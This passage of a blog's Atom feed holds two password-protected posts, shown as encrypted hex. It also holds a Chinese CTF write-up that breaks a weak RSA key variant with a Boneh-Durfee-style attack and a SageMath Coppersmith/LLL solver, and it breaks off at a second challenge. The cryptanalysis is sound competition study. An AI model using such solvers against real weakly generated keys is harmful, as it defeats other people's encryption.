c75caab45a071d844048370b090daed4ebbb71155f4b7e51c81ac2c1071e7166ab037f1934fcb94ffcd9c6fe7963bc6dd08087efc1b7f21683d3525910ec46ea9fa5e2b4225c7ae186e42ebaf8c70a2dd0814a465eeeea34f19e57eaec875aa7581f30a470b1394f5da7f3638a1ee8272bd4a616e6bbaa634df79c983ff0ab25e915050c11a10d3054816471a6e009f33b472ba4134f2b832657506f889da0e7a9587da289442ad100bfe7799d733b1c5dda033de8864f628832a95bf3f3efd67ed9a6b33902b1b23a07ae7276a5287ffafa4870728a4d0059a6e844ae124c18c66c002514c00d53002ee2daab6e90779f3f7a57ace74cf0e07f2c0ccd4772aa5d7681c0c5e79780af7de109c69245e3f45765d62c9a91eccd53054d446f5f59cbdb191806978579e8262541961cdc6b92cc68865de319caf5706dd8426578781cc6daf9188868509833780c3ad5cfdf96d7123f7dd993196b8fcfb37d0b519d23ec71badf4fd6a2c63b2dcc31938aa793d067d4176635e75cc64c5b6b655ffe630c9bd2ed08017a429a53a7eecdbeff38409f13a13b2f7ae5e8f48b8fccf9d6ae66285564a274fc7abf81072b3f0488a261b44f62895908de00b687f8f26252ab276e4baf420bff229b0f0b55c8ec4e87665700b7d81cb1f973838f34931cb6cd90e1d3103235b53d8f3eb7144a3425397d0d17df154af8ec74411b5b678b85207890bb2301a9aeb676083d8123a682beba61014600abd4eb4a556dc2cf4b08180102f5e8f4edcae077155f4979105608ded5703c1b436db5191e237dc319cedefe60b5b9d82db92f23752c2e4a095ff96ea515e7d21809436a4a4c861f8d9b291316665ca080fea1d171a020f7ee7b0b2b80b11a526a357545eee18bb6cb1de7f472268bf193aa8a124670492cfd4435c2b9a98758535cb74d0cd73caa73d69644d47a74cba98f6027210eddc16a1b24f4a18c4e38a449cf590a1cf839ceaec8c8b593ffb645b7bf61c50b65d023dcf976791848d22d618d8ba78c6700d6ddc2a307fe35dd45677e34d457e0b558d03f71270ed02999f8c25fba7f4578731123bdceff9be4478ff2e07ab498d4f64330b0056eaa68f10c576765aabfbd0679c7238a9359846aad0e9cef9e20fc753865f81bcb34f8abbeeb5fa34f3670870e26e929da9521673105f4b171e922aca94800f64cc3781f2a549a3f9e8c534fe6dd54475782bd52f732acf18092ba1f4908f891716c2cdf75410bc71adceafcccfbdbbb1c20571d23c17a9cbbc51365afd560f63632ca30a6af72eca7468854c40dd27b8963abedcadb4159bdf743005736c348251f1d1b712bd3eb46495d6ffeb7df534a620cd86c9290d70c24dcd3e3394896aa3e79e5c7694af7394b680e2126e39e8718976ec3f9eaa77d9c00a24a9052f24d3cb9db91a1c60a214f3318fd5e31cb73bcee602e17746aee381190e242a1231ecf7e7a3b5259ec3dba835949a1db73ba8fc548da5f801dfc8575779da0197dcdec0605175543c5d2e3341de3585f49ce5127f101a19ac60a7ab352c2cd752025952ee5aa084e2ed0996e9b3091c5c2d42d3fce2fe92378742094b699ead96ef981067c7fa3f7862081eabe634b8f25be15d92a960893e9156921d1814ea18bdaaf6b8c068652b5f962f75ab7bf17ef6f055c8951a83775e63d348a1552339f2c0a32f8dddfba560efef6f8b0e4b09a5318b51ca08a02099d6489caeb9220a41d080013f659762d0f2137292a1d3e276cb167381eec24094356e61db74d57ea5664618b97d617982f00b3f961d0f4be8649a38089d4dbebfd63ad67b1565ccb52a47f3fc18d3e79acc1f3844b6f90233cb12b217bf645228e13684bc5e712ce2d07a28fc57c1766d624fe89582f274c092f20b32f63da690a6235b561ce3566530191837161b776e201859d1f76f650219bfbf15d520fb5822e7c786885032072e3431071bef261b0ab810756719f986b1bd21da4226f883f28fa7416a6194620f2f6a1aabbcb017e74f313c279542429a62fb13a538168e3c45c948fd0d18efd9ead1e688d78e64c1d8fb7102554eb3c9c3ab246faf5310e1ef8fe26550c5f0adde3b628e23c7c38d8afabc417d601d3b0da3b121eda10cbf90be92dc47da19a80c29c28e0b8df255280d226b987829ab1f5d7aa1a9bde0178dc36d27223cfe3840ed29d52068f89b463c54b189d3982fdf2e3a159d69cbc5e7198af7543de90aea6fd0750404a9cc9b0145f509f31a155a8748acc665ab398c60dc373ae2a89d7fa536977c92aaf1d8282e8fd7e4e1e515923f151b0838f36147e0ee5a829712d2a9b5856449373001754e20a4097cd69589ffe617e0ff38a79df55c466869d9528e5d95a57216a97dfc515a893a8ab10409fac13f5747fded3d0e9cf353a1ae90151b0507ea9e4005eebe0f7b374e2bc753a538f9d34743b28ae1a6215e8f30f7873fb433304a13d41eeb422078a3d052633e4ccf927cec60b44f692895fb8d7c1f2b2ca86fd63b02543596d6a25a5d2313037f4de3dac63623589943735d6c9a6b83a402ef2f35216d100313e23e223e9caa34ac067fe50d284e644252bd5eb892ced0b84e86c194ea81c50fe972eac894f0f9f5eecf1cea703d5300a1d9cef80fa592c6d6e68e839dc999c85629581615f36100815ae08741bf9ced4a521953a538ec34873c35c93cb8b0db936af0448163feb69b3f2c18736e47cce5180f5c674b49f437964273ee3de1ee40178f054ce628ad18b5cfc277f30dcc2e37c42dfab3322c012ef7e4aa4a1c9adb565f366f0a8edd80f2ba60a8ed93d00a722c1ac17fe22f85927842af933c7f9030cc78d46cb86e1a77f5dbad8c74eb77a8ca0cd3db311f0f210cde9a23d3b451946278678e660051dc781a48be669ebd465d09b4de0e65e3f21699478950cf66de26e5cf9c99327c57577759f0274d8f575325cfad352b97846f443d20b5da9e0d0ca64bcf98ab32cdc15ee722e529f826b7b55920aeed80e28804b520b9a82d570662fc8485becf9d22096c3b6f83653e4b889d9fb6aafacf03d4c32e1b6c82ad62559de27d646f53d7a67c24ada4d07b4ce586ca5e5a4f83b68c176d62f10adf4d7df821eb41e601b8691ed81d683167bc073f0ab1df8804f091fac7a8e4aff40c56895664dacbfb92e8aab20b955af30fb95cce7911ba76ea34c02d2ab4589d6c6a082c5efcc0a485e62e6f187a980b4a6d6d05207d2c3f85da836034b0bb32e772b9cae51bd5b82b869b1529622cde95c01364718dce5786a258bd13f0195836e684a5d53fdae54a23842da749063fee10f3b014258ffefc5e8ac013f7f16444ba76e0cf8a371f800d9780b84a241b08da4cef3cd0597b5d0b8eeed2379f39a620efe8d90e76e0902045e7cc18438cb500f7e1bd020b6d29b95e25accdbe132031944c41f0ffdb2d69bab9aa1a6e7144064c75253d3114a907bd1b33270361a59ccb8b795024df2c75eb3fe6ba31c7dcd639859c733dcd59b7a89e45761161bba5de6d5a6de8a5034ef65eb4c05b6a14365c6612c34df0c8fb3d227e77b5855cdd53afce2c65789bffc772c607ebe57ca94da45734935dffab4e6e6d4709c40b1d211dec2f36b707b8f859ca68f7c3cf771c63fd4d911eab69ea4387858624586a87eb6aac5ed63e59042cb30f41c1cef6fd8ab815952c6b2ff9986b300f8f1087a123c82742b5c6e76eeceebc67b6e1e73a45356def64b64e39bafefd3e3d9ae073c3fd81a7e80b120801432910efa2a68e5d99fcda558b82728eb3a37060363e04bdae2c2751f862b242f9c70af15fc089cb2c3d526e3698b3fe69e7125441f30ca63a8b9928077a87143b549653a1e28646fa585287ad454de6bbda5613a078cb8e8fa567d00c0966b99ee94bbc04517dd1fe0f315dd03ff8d0743ca938a443b02164a74fb590f81e7aff5718e50253c3d59389545a73da355023b01bd1d7469e368876cae23fc35fdf71e41295a38312656869751cf78c6d4b8705ff9af8beccaf1623229b3714f854e2c10137504bedc260f2c2c7820cb5bed05374f1ebad0b79babf4c0cf8696ce6ab761a6c0d54ce1a6055852973fd28a7e8d2f75b52a33f71e148751507d97458c9f6ff88cae73611f4c7d486d77ca08157e5bd6c914fdd6b90e09448932a57a16781d25ee871c37b20a84a687b0a209165a689ea073d5af1fc22a6a7e6f413466d02a3d74d8cd69b21d90c9745fcc9accd6b8ecd4bedabe82c7edbcf88a064eaca8397bf9ce40d2ee3d72d787ce26c0abc50d03633571a060e1d54c56fb19ff17c5b5b616f0996426fa2e6124add47a8faf18e72f5fc9a6677baae786dae86d4c0d104ec3446b22478d5d2b60eb82a5f352ed0988eafbfe5c39e9ea5e4d36765275944745c7a1ffd35a7a4a1c3f4b696bac436b3e7877b278f81626c893d5a9b4cd42b00d197c6b0997adedc546a3b34ab127a20ef4e9c7194f5d1c4b48f1b84ca7aa4d54336180f417c1edef5e05738582165af34661cd9e547fda9a48ea8d22bbe9cef3f15536e62728d2ba59f0e83f1abdc447e8f2cf4e6ca3e008e12ecdc1d48994ddb33851731f208f70c44d32a744a7cc97bf979e9a1bcea2020710430443b1b2368b873f6d6c3d9c48eabfc29afec2dce2eb3a7994a44e2d492d0cbd8104410697d49a3cae4afa7646d926b7d79733567448a9e420d0808d1b8417ee8735796ff257a436b4de51ae3fbd030e9d0d6437e33e9bb387f5dde733fdee7b60ec7e5cf529b94db64bb71a9c04bc05d2c617a19dd47d193f015f9b17c484de4237c255faf099f9c6fd397bf22ddad662e1eb01c1f3c3f6f72635f880e3fe7a410080ea770c5cf6f5ec2423d8e40f62730d29e52158a940c6e336ac40490742c4cc54f268c54556b92925f788c7abcddca9064cde43a4c51d2636ef3c21a902bc110ac631c0f6d8adf03b05a55e437aac0f1665c2038ca66e4e91a367eb176e0ebb11eb5805860d1452dcd831ff849743b0422b55b2e7b6d7f46de0b59efb9fe58181d066f93c0ee0f7f99c0a7dfa0daa60eee581cabab13c24a7d4b30834cd672ca5e71cc6574cdaffd317ed2602bdb06df55a65a13fd7746af6050c220c9994aee05b165912bf625d7f8d75c07ecbe7283468a4618647dd054c3bc153af8be7346b1119150e7c967cd7251b17f5beff1070fd11efb510c95c126d697cf527e15a213fb38ff1e280320523895cb35a65a3b149b4fb2e4df1b7438c4b66cb050f29e06c2516e4d6ae6150fde74db5e85d08ec9810d1f7c0314bca35ac4e3fcae9e4a0e82363d730ca01a720ab6921c3562461bd08eaf7ee77fec11e795356e92bc4e8056be9aeb26d1e07d7e0049c76edee8fc8a12fadf2cacea8a4bc62188608009aaab58c962afacc8062c64099f34e2a9945ee66f2e4b921175f53b36df8e3430405474bebcdd7c648bcb756f6c886d2b36323b4da91bdd410325614a800a9001f8e7ecc41033d60a34e8841d9d15a23468b135ce6d60315b08c063ef5f74d118bfec46d24825a699c014848fbc0d9dd15f8d8d4a39ebc5e986cb4904e26d04a7f9ea36c61fa32c17152f57f4640668e019c321b7e09d07e8ff95d6895aec5f7e95c894332164ded136dd727bfa0815a5a3a2fd6816dcc27c2444087b776b46d970f446ebc7ab4b11ac8fcf91b22bfabc7f4f33d6a623022ffc196cb6459f3113eef2e63964539690798841c36da6e63d845d7041baee6e3034090cedc22267876002e1da73b208e1b9772b3c6b2860720818ef57ea4fd8398ef0b8617abe9bfc6084f10b9af80041b74b7f286fe2b1f966818acd1b09070d89dc6bd63e75ba204d229db8f629715451c3d8b9e2b391bd5e0583b38499ba7697ab331956e49b81d912014ab70a6c70e62e2dca575d070ee99b16d58acf5c046cedaf6827d0938b10c2e6dfa53dd81fa9a6844b0c571c6858de56967112336e11a3873062baa7bafcd55f3e323a6a8daaa334923b800345d88f20edfc8428ff3ce1e15c388a8c5ef81b1f5516232d536558809ce157c6931c90792d98c6e404ea7b22ac23ba500e31a050d7850c141b634c908519f7a025aa1d5b743d2aae862ed7de7f07721775dea5963a745eae8732f427c2431248e09883c1fae36d66a9c1827ed143af415d78e4538a5ae74af130336e1d4deb990106016bfa46fdd4d8e9ee8147b95a560eeee21506850cbc708a1bba7d7252165ce98fc90f5740a7f400c4a4059397049198f7d8b3fbf2507ea5ae2933c10dd41b42910cf938e05b536ce67012535d37623728ebe16940fa254e82b44c2bf034f27b180d727206f2632197c8089055253f422b5503af79719d1b4755834d0d06d41897b793d24c24eac568cdabd8a2eb99595101e9c2f3e8057b41185f9fd3668fdb00b3bd594d9202cd30386e0b02b14d5840fe9b064c8ea2c216bc14d34134b32fc513d89ba3f1df051fe88d973542fa92e5757a39763695e41d6b9e33ed143b7f4e1f1871b150230a893eb23474f3fe0c482a4017026a69f4ade9c8a7599fcbeb8f9ec924b60df0e260ab0958fa8c2a81e2069e7f781d618f021a78710a13a1fdd2c1e0798d5ef970b775d3505ffe18ce5ab9e391815a1632fea20aff2b04a5066eeb057edca08b975e9d63a2cdaac14ae193b44325144e915669020a697ef5b2f139b8f585eaf9d72e8284e168020de6896822143511485f7de69b129fbf552c9df8d39a6d24974a4e0c4d667aafba1dfd904f834420076fe2f635016417e8788670e78562fb1613480b98e60d48ba462a570ec8f5a26801a39a81b02c124bbe5452e6cbdf5e3ab367da5098d7d335cc38de8cb139e43ebb105427a07190c0d1a6f5477df41f90b50497ebaed6a60991d559fef0a9a7d1f2af37874bd46ff7f7d7ff13158888618bd793e4328d923cdc9da9766f866720ebc29bccc0a628f616b2b85c4402c090021d257b5dd62d820cadb660e7a21c319a28368c28c5d2654c668a043eb92c95bd552dfbd2116bffe13c90ace07b25dce2d99993d4d4f71a65317b08b6c27e3c7dac7a9465604feb87514e0478c4b2f8fa1d7cc151893eee04503579c8e4d7a6085b989fe841122384f44d1fb49848e7042965609209db49fa369a84e138b642e362b084b982f8575536b03b2a8015910c973d77d5a449275469ec55fa372c554285b300787d75975791c3c8ed7b35d4cca792b66ec83968d0a85b0467eca4e45f551fa870d175b026a5a32ada1cde369334741c0c0c55a6fe4bba950e088eb611d5519c72494b2b75cb851e886e79c74f865faf93debc51add791d2c2f82955d8441a3f408b0cb5dde39c76e8c68d58ceb9165134ba51dd9cc03df5318c64d17db034a8015390ba6b170281ac82678445cec837c01276a8a38e7907f9c49481b1f765a201997d31e25dc5af3ebe0e0098b698a4dffc5b536662df2a205ea2c95c0f0a98f9ae6d4c61a9978d1926d26fdbb4aa2930873856480c2b4c2cc37dc7d5324e2d9b3efa7190c9a18bae46aa1eb89452c8296da421c022d8ecc0425bfb56df6f0799dc97f8c9b1396a64e78a9c53d7bc90350656fe6c1097bbbdaebcfcb8f84eaf3d6aade91eb6f3fdb4ee7d14d3195c1a241b569a990bf3a04adb44bbc29c3e5182281abe0977eeefa79642d137c5c4e6094491ea4d5b3f9b3980224b3b9582ecc6ebbcdb1c0d1e6ee51c5fb289e62e733701f7a96303c9c16aac6174d70cfbf2cdc55b487575fa080b7a1421ee2eeae4f589fa8646ca6f7ff3f0746dd63528c4aac7532fbb253fe512f1ff09c0d62326ee1a7d84e8ecca88ec86f4adceba7ecffe690e96270cf6809f4ad93ddfd6d1d48a7220ffb907611b6a5836a0fb2ebc1282e1490f2180a2d86c514f1f75f248d3653a7b8aad343bbb864f90fea049d669f32d886b3a9eab88a6d9e02d34745299101f7242e5851f3d3e82d6c3b9ba5baf97255da651692643b4db89e2640a02a06badc1f7d67fa9de35453b8abc929073e38e4ac99bbbd240a32b753663ce02f8898f42016826666e9239e7f4836b9e649aeaf7cfc8f0bbd1313fa0fbbf6f3426a36ba31b64fa5ee84f4b9a67b26ffe87419aaa287166861593a5b0775b58aa1b10b0d7a6100bf011fdd7b9b06166f72541d1d6d6c5ea7e7335ca82648fbc5107bb181969cacc2b9470b1a19d8bb670df644862f700723ec650a6be56d54cbde7e6111fd9e4ed183e796758b28af8ba4a13f3de22aed6a05a79a2625d4453bace5e5ae20049d801d4979540336e387a2de761bf189818f9d8eff2a65c9d856afecca414f99080e73911f1ffa3c2c7283ef5dd5cd82267c08f81046e08b8e707f980a32d74676f014b6ff7db2e2469d27926406df37d33aeffdab5978505f396f13d0e5c7e46a6332e6691a6d8453839f4f9af01550efb025954ffe605bd0cc73f459986c5f04db0bce06fa619573ebe703d83f69307b621e7bab1e6f9e2b646de11214459bc1099983646a145699031ea8a35ab9d419ebf781f993fc4b3b93197caa639d7082add9a420751cc950c439bb478719c6ca484ee0765974f247c5e8dde1ac9f16e755378524a1779a6eb0fbd6d71e2c81d9e69a6401376b35d2894cab8549e1faa0c8882103332236c0eb95ccafa3074a259877369248e7bb1b086bda3f27d2c0d11abdd9cc609081869cb16d23ec4bf9313d0d9fa1162eefa874b2eb32c08b247c3d6b6851b7d3f494cee5675bbc6a092823a01849e514bef4a3bca9b145419cd291387f00e5f4d4bb8ce6f4363eaea319acf23078ead32622af91847171f292d7f97381d474f3c8a3932baba8a5fa719ba341d69a77adf3cecdc900a0d8b4c1b2b547f92bc0feab8f1861054e9e37daddc8e9f7e345027a809325298bd372d0273eb8f2c25301ed57b624cc253f0559f28758e13e29805a2ba9b4cfb01d4323c698ccfd626cb3d044af5c318886d6957590612e089f47ca4f407978982b1d60a5566e120c6efd92b7e525d6a5a3971bc3f083781c78a40ee94d28853eb98706fc7a7234244465e50bf0b7cf0fe21101e55c6993d5fd916429bb8b646d7ac4e9968a35de48d5c5c0caf88f8083ca8c565e98ac287872c315c6fa64211eaf0b18d8a2aa3d174df3</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">出了一道题，适时公开。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Enter password to read :).</summary>
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Days_Without_Internet</title>
    <link href="http://example.com/2024/01/25/Days-Without-Internet/"/>
    <id>http://example.com/2024/01/25/Days-Without-Internet/</id>
    <published>2024-01-25T15:06:44.000Z</published>
    <updated>2024-01-28T01:14:42.364Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="416a0dae2e9e6f8acd97b1feec9f2f94269daa51cf2b3c6f23e6598a20bcb7e3">1ccc3afe3f8e8a6933effeff5e279474dabc45c9513abdcd9350e81646bf173688d54434ad4284470f65ba32ff04289492cf5a1e6795ece30ff512a23bb7e12f153a6c0a38e1b83bbb6babc028ca2ae5004d2140335cedff1612db32161b307824c18c5886b239d3968da245ef2b30130364e824578382a79696001fff110d66c0431f17690435b008aab19b40745abc1a30939aad8058ca1fb25c641fa4f848bf6a40312f3632f4c68c70913a84cf265f1e0bc9febee50b8414ef18b487f379f6a3cdfadb6089e1c411c3be136f65b448b8939f2ea1471d7e0afe5f9025a69eef955f7e749edc9f027c4b2eb38cabb17bde3d0d51e9c47b1e62ac97eb78ee7892c8485813b5b08de9d2e128b551a8f417e7ce35127c0298c9f4222279e6e9e2feb0ff567a704abaaf98629cb2d122c529c8f4e944bc247516d21d4d001f27c0612b009b37249509d41dffcca92031cb360cf3e5ad5bd60b3b58f6267441ef2720edfdecf201ed6119210f92a96bebda9267a269330a502fb49925607600138ff964257d8c0cab265eaa6d556b3b7c2d5a4706ecfde29690a3a8534ce8081ca659821115702d75f6aa660816b9005ebea61700120575799ad8ad87c99b9f5cefb698cd3cc95ad96e5e26d614b94194638a9e6225839ae567361bad6bba5bfe9dfc1aebc2e8bd671bc6684a6d33893af7ec1c0c0f588e180e3ccdf8ab495d59abd4cd3e6a2683f43c396cf8e77f559f6469879aa89bfbb79adf2e4c6fbe66db5307e782b99e7b913ca52096ee7bd1fe304905dbdb8a78b2003e0457f5d66dd9edbc6fc8a474924881333cc09f0c6f2463330759ee819fe384573e8da398f9ca33db9ce07e46f3dc0dce108c44485549ea4d89cf93a4c7fd6d6acb41ccba38dabf612290aa9557235d146731a52a0e241f19319bb9e6b9c0399cb166c473cf065c8c8ef5ae64909ad8bc92de99e89f42d0d72b0c1333f2062e487b3ef0fa151e48091656e01a3cb1fcf90dcae299305dfa71342b2aaed62c710e732f2acd1391ebe8851b753f170610133d466f18237f400c103826809f0cfb1d7588d614b9c15573615ae93bc81742ff3a9691fafb2b3d8799192185a33ebf071b7c0029083802da4c75fa4daf8fcf384bd1d1bd2abce1500b888489b4379d1e0669e9502e3dcc7b6894e2ada71a0f75b57eb1d4852712f7d0c53f92d3f3425e739ce298a55f4289f442a861600055fb8026693d283726b8ce5e1ca34108337566e8b28bf40a8e762f94e4ae43dc166147de258a1459541b15fa7c5f47e89123de9b3469e355745b245fe7857f8f34316563b5c6e20117ab1a2284329c530b0953de3a2819f6bdb114f9d0d3235ce497aeb9e4a7f422577b5225a92b273b98d62b9e58cbe343cabb0e47ebda675953089c32d641955396</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">需要密码阅读捏。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Enter password to read.</summary>
    
    
    
    
    <category term="Other" scheme="http://example.com/tags/Other/"/>
    
  </entry>
  
  <entry>
    <title>CTF_Notes</title>
    <link href="http://example.com/2024/01/22/Chunqiu-CTF-2023/"/>
    <id>http://example.com/2024/01/22/Chunqiu-CTF-2023/</id>
    <published>2024-01-22T14:09:34.000Z</published>
    <updated>2024-01-28T08:03:29.656Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="0x1-Not-Wiener"><a href="#0x1-Not-Wiener" class="headerlink" title="0x1 Not Wiener"></a>0x1 Not Wiener</h1><p>题目是变体的Boneh-Durfee attack, 需要在理解攻击原理后做调整。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = phi - getPrime(<span class="number">540</span>)  <span class="comment"># make sure it is big enough that wiener&#x27;s attack doesn&#x27;t work</span></span><br><span class="line">e = <span class="built_in">pow</span>(d, -<span class="number">1</span>, phi)</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>).read().strip()</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;n = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;e = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;c = &#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由于<code>d = phi - D </code> (令D为540位的随机素数)，比正常的多了个负号，故要做一些调整。</p><p>列出RSA等式：<br>$$<br>ed\equiv e(\phi(n)-D)\equiv-eD\equiv1\pmod\phi(n)<br>$$<br>去掉mod: $-eD&#x3D;1+k\phi(n)$</p><p>两边同时mod e: $-1\equiv k\phi(n)\equiv k(n-s)\pmod e$</p><p>其中$s&#x3D;p+q-1$，k是与D差不多大的负数。</p><p>考虑以下的二元多项式：<br>$$<br>f(x,y) &#x3D; 1+x(n-y)<br>$$<br>可得$f(k,s)\equiv 0\pmod e$，所以(k, s)是f 的一个小根，可以用二元copper来解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">        d = f.degree()</span><br><span class="line"></span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line"></span><br><span class="line">    f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">    G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">        base = N ^ (m - i) * f ^ i</span><br><span class="line">        <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">            g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">            G.append(g)</span><br><span class="line"></span><br><span class="line">    B, monomials = G.coefficient_matrix()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line"></span><br><span class="line">    factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line"></span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line"></span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, <span class="number">1</span> / factor)</span><br><span class="line"></span><br><span class="line">    H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B * monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">            H.pop()</span><br><span class="line">        <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">            roots = []</span><br><span class="line">            <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">                root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            <span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = </span><br><span class="line">e = </span><br><span class="line">c = </span><br><span class="line">P = Zmod(ZZ(e))[<span class="string">&quot;k,s&quot;</span>]</span><br><span class="line">k, s = P.gens()</span><br><span class="line">f = <span class="number">1</span> + k * (n - s)</span><br><span class="line">rs = small_roots(f, (<span class="number">2</span>**<span class="number">540</span>, <span class="number">2</span>**<span class="number">1025</span>), m=<span class="number">4</span>, d=<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(rs)</span><br><span class="line">k, s = <span class="built_in">map</span>(<span class="built_in">int</span>, rs[<span class="number">0</span>])</span><br><span class="line">phi = n - s</span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure><h2 id="0x2-Not-Wiener-Another"><a href="#0x2-Not-Wiener-Another" class="headerlink" title="0x2 Not Wiener(Another)"></a>0x2 Not Wiener(Another)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 